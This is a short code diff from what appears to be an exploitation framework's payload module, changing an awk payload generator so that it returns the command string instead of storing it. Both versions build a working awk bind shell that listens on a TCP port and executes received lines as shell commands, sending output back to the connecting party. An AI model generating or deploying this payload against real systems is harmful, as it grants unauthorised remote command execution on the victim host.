@@ -22,6 +22,5 @@ class Exploit(payloads.Payload):
     awk_binary = exploits.Option('awk', 'Awk binary')
 
     def generate(self):
-        self.payload = (self.awk_binary + " 'BEGIN{s=\"/inet/tcp/" + str(self.rport) + "/0/0\";"
-                        "for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)\}'")
-
+        return (self.awk_binary + " 'BEGIN{s=\"/inet/tcp/" + str(self.rport) + "/0/0\";"
+                "for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)\}'")
